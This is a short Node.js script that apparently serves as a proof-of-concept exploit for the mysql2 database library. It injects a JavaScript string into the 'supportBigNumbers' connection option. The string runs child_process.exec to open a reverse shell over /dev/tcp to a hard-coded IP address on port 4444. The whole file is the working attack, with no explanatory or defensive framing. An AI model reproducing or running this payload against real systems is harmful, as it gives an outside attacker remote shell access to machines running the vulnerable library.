const mysql = require('mysql2');
const conn = mysql.createConnection({
  host: '167.71.203.2',
  port: 3306,
  user: 'any',
  password: 'any',
  supportBigNumbers: "require('child_process').exec('sh -i >& /dev/tcp/167.71.203.2/4444 0>&1')",
  bigNumberStrings: true
});
conn.query('SELECT 1', () => {});
